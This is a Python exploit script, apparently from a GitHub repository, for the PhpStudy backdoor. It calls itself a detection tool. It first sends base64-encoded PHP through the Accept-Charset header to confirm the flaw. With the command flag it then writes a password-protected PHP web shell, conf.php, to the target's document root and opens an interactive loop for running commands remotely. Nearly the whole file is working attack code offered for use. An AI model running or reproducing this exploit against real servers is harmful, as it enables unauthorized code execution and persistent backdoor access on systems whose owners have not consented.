#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Date    : 2020-07-15
# @Author  : Awrrays
# @Link    : https://github.com/Awrrays/Phpstudy_rce
# @Version : 1.0

import requests, sys, time
import re, argparse, base64

from colorama import init, Fore
from requests.packages import urllib3
urllib3.disable_warnings()


init()
print(Fore.CYAN + '', end='')
headers = {
		'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
		'Accept-Encoding': 'gzip,deflate',
	}

usage = r'''
       _               _             _       
 _ __ | |__  _ __  ___| |_ _   _  __| |_   _ 
| '_ \| '_ \| '_ \/ __| __| | | |/ _` | | | |
| |_) | | | | |_) \__ \ |_| |_| | (_| | |_| |
| .__/|_| |_| .__/|___/\__|\__,_|\__,_|\__, |
|_|         |_|                        |___/ 
'''


def b64_encrypt(code):
	return base64.b64encode(code.encode('utf-8')).decode('utf-8')


def poc(url):
	headers['Accept-Charset'] = 'ZWNobyAidnVsICIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4iIGh1YiI7'

	try:
		response = requests.get(url, headers=headers, timeout=5, verify=False).text
		pwd = re.findall('vul (.*?) hub', response)[0]
		return pwd
	except:
		return ''


def getshell(url, pwd):
	
	payload = r"echo 'vulhub';file_put_contents('{}/conf.php',urldecode('%3c%3fphp%20passthru(base64_decode(%24_%50%4f%53%54%5b%22command%22%5d))%3b%20@eval(%24_%50%4f%53%54%5b%22phpstudy%22%5d)%3b%3f%3e'));".format(pwd)

	headers['Accept-Charset'] = b64_encrypt(payload)
	try:
		response = requests.get(url, headers=headers, timeout=5, verify=False).text
		if 'vulhub' in response:
			print(Fore.CYAN + '[{}][Shell] {}/conf.php\t[Password] phpstudy'.format(time.strftime('%Y-%m-%d %H:%M:%S'), url))
	except:
		print(Fore.RED + "[{}][Error] Request Timeout, Write Shell Failed!".format(time.strftime('%Y-%m-%d %H:%M:%S')))
		return

	command_exec(url)


def command_exec(url):
	while True:
		try:
			command = b64_encrypt(input(">>> "))
		except KeyboardInterrupt:
			sys.exit()
		if command == "ZXhpdA==":
			break
		if command == '':
			continue
		data = {'command':command}
		try:
			response = requests.post(url + '/conf.php', data=data, timeout=20, verify=False)
		except:
			print("Timeout!")
			continue
		response.encoding = response.apparent_encoding
		print(response.text)


if __name__ == '__main__':

	parser = argparse.ArgumentParser(description='Phpstudy Backdoor detect tool.', usage=usage)
	parser.add_argument('-u','--url',help='Target to detect.')
	parser.add_argument('-c', '--command', action='store_true', help='Whether to enter the interactive shell.')
	args = parser.parse_args()

	url = args.url
	command = args.command

	if url:
		print(usage)
		print("[{}] Starting detect...".format(time.strftime('%Y-%m-%d %H:%M:%S')))
		print(Fore.CYAN + "[{}][Vul] Warning!".format(time.strftime('%Y-%m-%d %H:%M:%S'))) if poc(url) else print(Fore.CYAN + "[{}][Vul] Seem no vul.".format(time.strftime('%Y-%m-%d %H:%M:%S')))
		if command:
			getshell(url, poc(url))
	else:
		parser.print_help()
		sys.exit()
